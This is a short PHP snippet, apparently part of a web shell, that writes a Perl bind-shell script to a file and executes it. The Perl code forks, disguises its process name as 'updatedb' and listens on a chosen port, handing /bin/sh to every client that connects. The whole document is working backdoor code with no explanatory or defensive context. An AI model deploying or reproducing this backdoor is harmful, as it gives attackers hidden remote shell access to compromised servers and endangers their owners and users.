<?php
$bfileneme = $_REQUEST['filename'];
$bport = $_REQUEST['port'];
if (isset($bfileneme) && ($bfileneme!="") && isset($bport) && ($bport!="")){
	$script="
		#!/usr/bin/perl
		\$port = $bport; 
		\$port = \$ARGV[0] if \$ARGV[0];
		exit if fork;
		\$0 = \"updatedb\" . \" \" x100;
		\$SIG{CHLD} = 'IGNORE';
		use Socket;
		socket(S, PF_INET, SOCK_STREAM, 0);
		setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
		bind(S, sockaddr_in(\$port, INADDR_ANY));
		listen(S, 50);
		while(1)
		{
			accept(X, S);
			unless(fork)
			{
				open STDIN, \"<&X\";
				open STDOUT, \">&X\";
				open STDERR, \">&X\";
				close X;
				exec(\"/bin/sh\");
			}
			close X;
		}";

	$f = fopen("$d/$bfileneme", "w+");
	fwrite($f, $script);
	fclose($f);
	system("perl $d/$bfileneme");
	echo "<meta http-equiv=Refresh content=\"0; url=$PHP_SELF?d=$d&show\">";
}
?>